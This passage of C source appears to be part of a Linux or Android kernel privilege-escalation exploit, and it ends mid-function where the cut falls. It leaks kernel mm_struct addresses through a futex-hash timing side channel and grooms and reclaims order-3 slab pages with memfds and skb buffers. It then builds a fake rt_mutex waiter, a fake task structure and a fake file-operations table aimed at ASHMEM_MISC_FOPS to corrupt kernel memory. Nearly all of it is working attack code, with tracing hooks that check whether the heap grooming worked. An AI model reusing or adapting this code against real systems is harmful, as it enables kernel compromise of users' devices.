void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
enum controlled_mm_zone {
  CONTROLLED_MM_INVALID,
  CONTROLLED_MM_DMA32,
  CONTROLLED_MM_NORMAL,
};

static pid_t clone_controlled_leak_child(
    struct kernelsnitch_shared_state *state) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(2);
    }
    kernelsnitch_find_collisions(state);
    _exit(kernelsnitch_found_collisions(state) ? 0 : 4);
  }
  return child;
}

static enum controlled_mm_zone controlled_mm_zone_of(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);

  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END) {
    return CONTROLLED_MM_DMA32;
  }
  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END) {
    return CONTROLLED_MM_NORMAL;
  }
  return CONTROLLED_MM_INVALID;
}

static const char *controlled_mm_zone_name(enum controlled_mm_zone zone) {
  if (zone == CONTROLLED_MM_DMA32) {
    return "dma32";
  }
  if (zone == CONTROLLED_MM_NORMAL) {
    return "normal";
  }
  return "invalid";
}

static int controlled_mm_valid(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
  uintptr_t offset = mm - base;

  return controlled_mm_zone_of(mm) != CONTROLLED_MM_INVALID &&
         offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
}

static uintptr_t controlled_mm_match_page(
    const struct kernelsnitch_shared_state *state, uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t count = 0;

  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(state->futex_addrs[0], candidate);
    size_t matches = 1;

    for (size_t i = 1; i < state->collisions; ++i) {
      matches += hash == futex_hash(state->futex_addrs[i], candidate);
    }
    if (matches == state->collisions) {
      found = candidate;
      count++;
    }
  }
  return count == 1 ? found : (uintptr_t)-1;
}

#if defined(QEMU_MM_TRACE_ORACLE) || defined(QEMU_MM_TRACE_VALIDATE)
static int qemu_mm_trace_fd = -1;

static int qemu_mm_trace_ready(void) {
  if (qemu_mm_trace_fd >= 0) {
    return 1;
  }
  const char *value = getenv("QEMU_MM_TRACE_FD");
  char *end = NULL;
  long parsed;

  if (!value || !*value) {
    pr_error("qemu mm trace fd missing\n");
    return 0;
  }
  errno = 0;
  parsed = strtol(value, &end, 10);
  if (errno || end == value || *end || parsed < 0 ||
      fcntl((int)parsed, F_GETFD) < 0) {
    pr_error("qemu mm trace fd invalid value=%s errno=%d\n", value, errno);
    return 0;
  }
  qemu_mm_trace_fd = (int)parsed;
  return 1;
}

static int qemu_mm_trace_drain(void) {
  char data[16384];

  if (!qemu_mm_trace_ready()) {
    return 0;
  }
  for (;;) {
    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data));
    if (size > 0) {
      continue;
    }
    if (size < 0 && errno != EAGAIN && errno != EINTR) {
      pr_error("qemu mm trace drain errno=%d\n", errno);
      return 0;
    }
    return 1;
  }
}

static int qemu_mm_trace_read(uintptr_t *mm_out) {
  char data[16384];
  char pid_token[32];

  snprintf(pid_token, sizeof(pid_token), "-%d ", getpid());
  for (size_t retry = 0; retry < 200; ++retry) {
    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data) - 1);
    if (size < 0) {
      if (errno == EAGAIN || errno == EINTR) {
        usleep(1000);
        continue;
      }
      pr_error("qemu mm trace read errno=%d\n", errno);
      return 0;
    }
    if (!size) {
      usleep(1000);
      continue;
    }
    data[size] = 0;
    char *line = data;
    while (line && *line) {
      char *next = strchr(line, '\n');
      if (next) {
        *next++ = 0;
      }
      char *event = strstr(line, "kmem_cache_alloc:");
      char *ptr = event ? strstr(event, " ptr=") : NULL;
      int mm_callsite = event &&
          (strstr(event, "call_site=copy_mm+") ||
           strstr(event, "call_site=mm_alloc+"));
      if (mm_callsite && ptr && strstr(line, pid_token)) {
        unsigned long long parsed = 0;
        if (sscanf(ptr, " ptr=%llx", &parsed) == 1 && parsed) {
          *mm_out = (uintptr_t)parsed;
          return 1;
        }
      }
      line = next;
    }
  }
  pr_error("qemu mm trace missed pid=%d\n", getpid());
  return 0;
}
#endif

static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
                              uintptr_t *mm_out, int *hint_hit) {
#ifdef QEMU_MM_TRACE_ORACLE
  pid_t child;
  int fd;

  (void)cpu_count;
  if (!qemu_mm_trace_drain()) {
    return -1;
  }

  child = clone_child();
  fd = open_memfd(child);
  kill_child(child);
  if (qemu_mm_trace_read(mm_out)) {
    *hint_hit = hint && ((*mm_out & ~(ORDER3_SIZE - 1)) == hint);
    pr_info("qemu mm oracle pid=%d mm=%016zx hint=%d\n",
            getpid(), *mm_out, *hint_hit);
    return fd;
  }
  close(fd);
  return -2;
#else
  uintptr_t current_hint = hint;
  size_t collisions = hint ? S918_KSNITCH_HINT_COLLISIONS
                           : S918_KSNITCH_FULL_COLLISIONS;
  size_t passes = hint ? 2 : 1;

  *hint_hit = 0;
  for (size_t pass = 0; pass < passes; ++pass) {
    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    pid_t child;
    int fd;
    int status;

    if (!state) {
      return -1;
    }
    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
#ifdef QEMU_MM_TRACE_VALIDATE
    uintptr_t oracle_mm = 0;
    if (!qemu_mm_trace_drain()) {
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      return -1;
    }
#endif
    child = clone_controlled_leak_child(state);
    fd = open_memfd(child);
    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                   !WEXITSTATUS(status) &&
                   kernelsnitch_found_collisions(state);
#ifdef QEMU_MM_TRACE_VALIDATE
    int oracle_ok = qemu_mm_trace_read(&oracle_mm);
    if (!child_ok) {
      pr_info("qemu mm validate collision=0 actual=%016zx trace=%d\n",
              oracle_mm, oracle_ok);
    }
#endif
    if (!child_ok) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      if (current_hint) {
        current_hint = 0;
        collisions = S918_KSNITCH_FULL_COLLISIONS;
        continue;
      }
      return -2;
    }
    if (current_hint) {
      state->mm_struct = controlled_mm_match_page(state, current_hint);
      if (state->mm_struct == (uintptr_t)-1) {
        close(fd);
        state->state = KERNELSNITCH_MM_NOT_FOUND;
        kernelsnitch_cleanup(state);
        current_hint = 0;
        collisions = S918_KSNITCH_FULL_COLLISIONS;
        continue;
      }
      state->found = 1;
      state->state = KERNELSNITCH_MM_FOUND;
      *hint_hit = 1;
    } else {
      kernelsnitch_bruteforce(state);
    }
    if (state->mm_struct == (uintptr_t)-1) {
      close(fd);
      kernelsnitch_cleanup(state);
      return -2;
    }
    *mm_out = state->mm_struct;
#ifdef QEMU_MM_TRACE_VALIDATE
    pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
            "hint=%d\n",
            *mm_out, oracle_mm, oracle_ok && *mm_out == oracle_mm,
            oracle_ok && ((*mm_out & ~(ORDER3_SIZE - 1)) ==
                          (oracle_mm & ~(ORDER3_SIZE - 1))),
            *hint_hit);
    if (!oracle_ok || *mm_out != oracle_mm) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      return -2;
    }
#endif
    kernelsnitch_cleanup(state);
    return fd;
  }
  return -2;
#endif
}

static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                       int *chosen_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t max_groups = 64;
  const size_t opaque_capacity = S918_PAGE_SCAN_MAX * batch;
  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
  size_t *counts = calloc(max_groups, sizeof(*counts));
  int *fds = malloc(max_groups * batch * sizeof(*fds));
  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
  size_t opaque_count = 0;
  size_t group_count = 0;
  size_t chosen = max_groups;
  uintptr_t hint = 0;
  unsigned long chosen_attempt = 0;
  int result = 0;

  if (!bases || !counts || !fds || !seen || !opaque) {
    SYSCHK(-1);
  }
  for (size_t i = 0; i < max_groups * batch; ++i) {
    fds[i] = -1;
  }
  for (size_t i = 0; i < batch; ++i) {
    chosen_fds[i] = -1;
  }
  pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
          S918_PAGE_SCAN_MAX, batch, S918_DMA32_SKIP_SLABS);

  for (unsigned long attempt = 1;
       attempt <= S918_PAGE_SCAN_MAX && !result; ++attempt) {
    uintptr_t mm = 0;
    uintptr_t base;
    size_t slot;
    size_t group = max_groups;
    int hint_hit;
    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);

    if (fd == -2) {
      continue;
    }
    if (fd < 0) {
      break;
    }
    if (!controlled_mm_valid(mm)) {
      SYSCHK(close(fd));
      continue;
    }
    base = mm & ~(ORDER3_SIZE - 1);
    slot = (mm - base) / MM_STRUCT_SZ;
    if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
      size_t refs = S918_DMA32_SKIP_SLABS * batch;

      if (opaque_count + refs > opaque_capacity) {
        SYSCHK(close(fd));
        break;
      }
      opaque[opaque_count++] = fd;
      pin_to_core(CORE);
      for (size_t i = 1; i < refs; ++i) {
        opaque[opaque_count++] = clone_memfd();
      }
      pr_info("controlled mm dma32 skip attempt=%lu base=%016zx refs=%zu total=%zu\n",
              attempt, base, refs, opaque_count);
      hint = 0;
      continue;
    }
    hint = base;
    for (size_t i = 0; i < group_count; ++i) {
      if (bases[i] == base) {
        group = i;
        break;
      }
    }
    if (group == max_groups && group_count < max_groups) {
      group = group_count++;
      bases[group] = base;
      pr_info("controlled mm group opened attempt=%lu group=%zu "
              "base=%016zx hint=%d\n",
              attempt, group, base, hint_hit);
    }
    if (group == max_groups || slot >= batch) {
      SYSCHK(close(fd));
      continue;
    }
    if (seen[group * batch + slot]) {
      SYSCHK(close(fd));
      hint = base;
      pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
              "base=%016zx slot=%zu\n",
              attempt, group, base, slot);
      continue;
    }
    seen[group * batch + slot] = 1;
    fds[group * batch + slot] = fd;
    counts[group]++;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] + 1 >= batch) {
      pr_info("controlled mm group attempt=%lu group=%zu base=%016zx slot=%zu count=%zu hint=%d\n",
              attempt, group, base, slot, counts[group], hint_hit);
    }
    if (counts[group] == batch) {
      chosen = group;
      chosen_attempt = attempt;
      *base_out = base;
      result = 1;
    }
  }

  pin_to_core(CORE);
  for (size_t group = 0; group < group_count; ++group) {
    for (size_t slot = 0; slot < batch; ++slot) {
      int fd = fds[group * batch + slot];

      if (fd < 0) {
        continue;
      }
      if (result && group == chosen) {
        chosen_fds[slot] = fd;
        continue;
      }
      SYSCHK(close(fd));
    }
  }
  for (size_t i = 0; i < opaque_count; ++i) {
    SYSCHK(close(opaque[i]));
  }
  if (result) {
    pr_info("controlled mm group full group=%zu base=%016zx attempts=%lu zone=%s\n",
            chosen, *base_out, chosen_attempt,
            controlled_mm_zone_name(controlled_mm_zone_of(*base_out)));
  } else {
    pr_warning("controlled mm group failed groups=%zu scans=%d\n",
               group_count, S918_PAGE_SCAN_MAX);
  }
  free(opaque);
  free(seen);
  free(fds);
  free(counts);
  free(bases);
  return result;
}

struct controlled_mm_drain_state {
  int *triggers;
  size_t trigger_count;
  int s2;
};

static void release_controlled_mm_drain(
    struct controlled_mm_drain_state *state) {
  size_t closed = 0;

  pin_to_core(CORE);
  for (size_t i = 0; i < state->trigger_count; ++i) {
    if (state->triggers[i] < 0) {
      continue;
    }
    SYSCHK(close(state->triggers[i]));
    state->triggers[i] = -1;
    closed++;
  }
  if (state->s2 >= 0) {
    SYSCHK(close(state->s2));
    state->s2 = -1;
    closed++;
  }
  free(state->triggers);
  state->triggers = NULL;
  state->trigger_count = 0;
  pr_info("controlled mm trigger release closed=%zu cpu=%d\n",
          closed, sched_getcpu());
}

static int drain_controlled_mm_group(
    int *target_fds, struct controlled_mm_drain_state *state,
    int shaping_sv[2]) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t trigger_refs = S918_TRIGGER_SLABS * batch;

  state->triggers = malloc(trigger_refs * sizeof(*state->triggers));
  state->trigger_count = trigger_refs;
  state->s2 = -1;
  if (!state->triggers) {
    errno = ENOMEM;
    SYSCHK(-1);
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < trigger_refs; ++i) {
    state->triggers[i] = clone_memfd();
  }
  state->s2 = clone_memfd();
  pr_info("controlled mm trigger ready pages=%d refs=%zu s2=%d cpu=%d\n",
          S918_TRIGGER_SLABS, trigger_refs, state->s2, sched_getcpu());
  for (size_t i = 0; i + 1 < batch; ++i) {
    SYSCHK(close(target_fds[i]));
    target_fds[i] = -1;
  }
  for (size_t page = 0; page < S918_TRIGGER_SLABS; ++page) {
    size_t index = page * batch;
    SYSCHK(close(state->triggers[index]));
    state->triggers[index] = -1;
  }
  pr_info("controlled mm target tail armed pages=%d refs_held=%zu shape=ready cpu=%d\n",
          S918_TRIGGER_SLABS,
          trigger_refs - S918_TRIGGER_SLABS + 1, sched_getcpu());
  SYSCHK(fflush(NULL));
  SYSCHK(close(shaping_sv[0]));
  shaping_sv[0] = -1;
  SYSCHK(close(shaping_sv[1]));
  shaping_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(target_fds[batch - 1]));
  target_fds[batch - 1] = -1;
  return 1;
}

#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
struct reclaim_tracefs_gate {
  int enabled;
  unsigned long long pfn;
};

static int reclaim_tracefs_write(const char *path, const char *text) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("reclaim tracefs open failed path=%s errno=%d\n", path,
               errno);
    return 0;
  }
  size_t size = strlen(text);
  ssize_t wrote = write(fd, text, size);
  int saved_errno = errno;
  if (close(fd) != 0) {
    pr_warning("reclaim tracefs close failed path=%s errno=%d\n", path,
               errno);
    return 0;
  }
  if (wrote != (ssize_t)size) {
    pr_warning("reclaim tracefs write failed path=%s wrote=%zd size=%zu errno=%d\n",
               path, wrote, size, saved_errno);
    return 0;
  }
  return 1;
}

static int reclaim_tracefs_stop(void) {
  int ok = 1;
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/enable", "0");
  return ok;
}

static int reclaim_tracefs_start(uintptr_t base,
                                 struct reclaim_tracefs_gate *gate) {
  memset(gate, 0, sizeof(*gate));
  if (base < P0_PAGE_OFFSET) {
    pr_warning("reclaim tracefs bad base=%016zx page_offset=%016llx\n",
               base, (unsigned long long)P0_PAGE_OFFSET);
    return 0;
  }
  unsigned long long phys =
      (unsigned long long)(base - P0_PAGE_OFFSET) + P0_PHYS_OFFSET;
  gate->pfn = phys >> PAGE_SHIFT;
  char filter[96];
  int filter_size = snprintf(filter, sizeof(filter),
                             "order == 3 && common_pid == %d", getpid());
  if (filter_size < 0 || (size_t)filter_size >= sizeof(filter)) {
    pr_warning("reclaim tracefs filter build failed pid=%d\n", getpid());
    return 0;
  }
  int ok = 1;
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "0");
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/events/enable", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/filter", filter);
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/filter", filter);
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/trace", "\n");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "1");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/enable", "1");
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "1");
  if (!ok) {
    reclaim_tracefs_stop();
    pr_warning("reclaim tracefs arm failed pfn=0x%llx\n", gate->pfn);
    return 0;
  }
  gate->enabled = 1;
  pr_info("reclaim tracefs armed base=%016zx phys=%016llx pfn=0x%llx pid=%d\n",
          base, phys, gate->pfn, getpid());
  return 1;
}

static int reclaim_tracefs_finish(struct reclaim_tracefs_gate *gate) {
  if (!gate->enabled) {
    return 1;
  }
  int controls_ok = reclaim_tracefs_stop();
  FILE *fp = fopen("/sys/kernel/tracing/trace", "re");
  if (!fp) {
    pr_warning("reclaim tracefs read open failed errno=%d\n", errno);
    return 0;
  }
  char *line = NULL;
  size_t capacity = 0;
  size_t lines = 0;
  size_t order3_free = 0;
  size_t order3_alloc = 0;
  size_t exact_free = 0;
  size_t exact_alloc = 0;
  size_t exact_alloc_after_free = 0;
  size_t exact_skb_alloc_after_free = 0;
  size_t parse_fail = 0;
  int saw_exact_free = 0;
  int exact_free_cpu = -1;
  int exact_alloc_cpu = -1;
  char exact_free_line[512] = {0};
  char exact_alloc_line[512] = {0};
  while (getline(&line, &capacity, fp) >= 0) {
    const char *event = strstr(line, "mm_page_free:");
    int is_free = event != NULL;
    if (!event) {
      event = strstr(line, "mm_page_alloc:");
    }
    if (!event || !strstr(event, "order=3")) {
      continue;
    }
    lines++;
    if (is_free) {
      order3_free++;
    } else {
      order3_alloc++;
    }
    const char *pfn_text = strstr(event, "pfn=0x");
    unsigned long long pfn = 0;
    if (!pfn_text || sscanf(pfn_text, "pfn=0x%llx", &pfn) != 1) {
      parse_fail++;
      continue;
    }
    if (pfn != gate->pfn) {
      continue;
    }
    const char *cpu_text = strchr(line, '[');
    int cpu = -1;
    if (!cpu_text || sscanf(cpu_text, "[%d]", &cpu) != 1) {
      parse_fail++;
      continue;
    }
    if (is_free) {
      exact_free++;
      saw_exact_free = 1;
      exact_free_cpu = cpu;
      if (!exact_free_line[0]) {
        size_t size = strcspn(line, "\r\n");
        if (size >= sizeof(exact_free_line)) {
          size = sizeof(exact_free_line) - 1;
        }
        memcpy(exact_free_line, line, size);
      }
    } else {
      exact_alloc++;
      if (saw_exact_free) {
        exact_alloc_after_free++;
        exact_alloc_cpu = cpu;
        if (strstr(event, "GFP_NOWAIT") && strstr(event, "__GFP_COMP")) {
          exact_skb_alloc_after_free++;
        }
        if (!exact_alloc_line[0]) {
          size_t size = strcspn(line, "\r\n");
          if (size >= sizeof(exact_alloc_line)) {
            size = sizeof(exact_alloc_line) - 1;
          }
          memcpy(exact_alloc_line, line, size);
        }
      }
    }
  }
  int read_error = ferror(fp);
  int saved_errno = errno;
  free(line);
  if (fclose(fp) != 0) {
    pr_warning("reclaim tracefs read close failed errno=%d\n", errno);
    controls_ok = 0;
  }
  pr_info("reclaim tracefs result pfn=0x%llx free=%zu alloc=%zu alloc_after_free=%zu skb_alloc_after_free=%zu free_cpu=%d alloc_cpu=%d order3_free=%zu order3_alloc=%zu lines=%zu parse_fail=%zu controls=%d\n",
          gate->pfn, exact_free, exact_alloc, exact_alloc_after_free,
          exact_skb_alloc_after_free, exact_free_cpu, exact_alloc_cpu,
          order3_free, order3_alloc, lines, parse_fail, controls_ok);
  if (exact_free_line[0]) {
    pr_info("reclaim tracefs exact free %s\n", exact_free_line);
  }
  if (exact_alloc_line[0]) {
    pr_info("reclaim tracefs exact alloc %s\n", exact_alloc_line);
  }
  if (read_error) {
    pr_warning("reclaim tracefs read failed errno=%d\n", saved_errno);
    return 0;
  }
  if (!controls_ok || parse_fail || exact_free != 1 ||
      exact_alloc_after_free < 1 || exact_skb_alloc_after_free < 1 ||
      exact_free_cpu != CORE || exact_alloc_cpu != CORE) {
    pr_warning("reclaim tracefs gate failed pfn=0x%llx\n", gate->pfn);
    return 0;
  }
  pr_success("reclaim tracefs gate ok pfn=0x%llx\n", gate->pfn);
  return 1;
}
#endif

#endif

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  intptr_t payload_delta = SKB_DATA_DELTA;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_SKB_DATA_DELTA)
  /* Use the fragment's 0xe80 data start for both oracle and FOPS pages. */
  payload_delta = SLIDE_S928_SKB_DATA_DELTA;
#endif
  uintptr_t payload_base = base + payload_delta;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    slide_bank_payload_base = payload_base;
    for (size_t chunk = 0;
         chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
         chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
        uintptr_t parent;
        uintptr_t target;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
        if (slot == P0_ORACLE_GATE_SLOT) {
          parent = direct_to_page(base);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
          p0_gate_page_struct = parent;
        } else if (slot == P0_ORACLE_PROBE_SLOT) {
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_PROBE_PARENT_OFF) && \
    defined(SLIDE_S928_PROBE_TARGET_IMAGE_OFF)
          parent = base + SLIDE_S928_PROBE_PARENT_OFF;
          target = P0_DATA_ALIAS_CONST(
                       KIMAGE_TEXT_BASE +
                       SLIDE_S928_PROBE_TARGET_IMAGE_OFF) +
                   slide_p0_offset;
#else
          uintptr_t direct_addr =
              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
              P0_ORACLE_PROBE_OFFSET;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
          if (p0_virtual_base_probe) {
            direct_addr = data_addr(ASHMEM_MISC_FOPS);
          }
#endif
          parent = direct_to_page(direct_addr);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                   sizeof(struct user_pipe_buffer);
          p0_probe_page_struct = parent;
#endif
        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
          parent = p0_gate_page_struct;
          target = 0;
        } else {
          parent = p0_probe_page_struct;
          target = 0;
        }
#else
        uintptr_t offset = slide_bank_offsets[slot];
        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
#endif
        slide_bank_parents[slot] = parent;
        slide_bank_targets[slot] = target;
        size_t task_off = slide_bank_task_off +
                          slot * ACTIVE_SLIDE_BANK_TASK_STRIDE;
        size_t lock_off = slide_bank_lock_off +
                          slot * SLIDE_BANK_SLOT_STRIDE;
        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
        uintptr_t task = payload_base + task_off;
        uintptr_t lock = payload_base + lock_off;
        uintptr_t waiter = payload_base + waiter_off;

        put32(p, lock_off + 0x00, 0);
        put64(p, lock_off + 0x08, waiter);
        put64(p, lock_off + 0x10, waiter);
        put64(p, lock_off + 0x18, slide_bank_lock_owner(task));

        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                        lock, SLIDE_FAKE_WAITER_PRIO);

        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
      }
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
#else
    return select_slide_payload_slot(slide_bank_offsets[0]);
#endif
  }
#endif

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
    slide_bank_payload_base = payload_base;
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
    p0_gate_page_struct = direct_to_page(base);
    slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_GATE_SLOT] =
        pipebuf_page_base +
        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
    slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
    if (fops_data_probe_active) {
      p0_gate_page_struct = direct_to_page(base);
      p0_probe_page_struct =
          direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
      slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
          sizeof(struct user_pipe_buffer);
      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
          p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] =
          p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
      slide_bank_parents[P0_ORACLE_PRODUCTION_SLOT] = fake_fops;
      slide_bank_targets[P0_ORACLE_PRODUCTION_SLOT] =
          data_addr(ASHMEM_MISC_FOPS);
#endif
    } else {
      slide_bank_parents[0] = fake_fops;
      slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
    }
#else
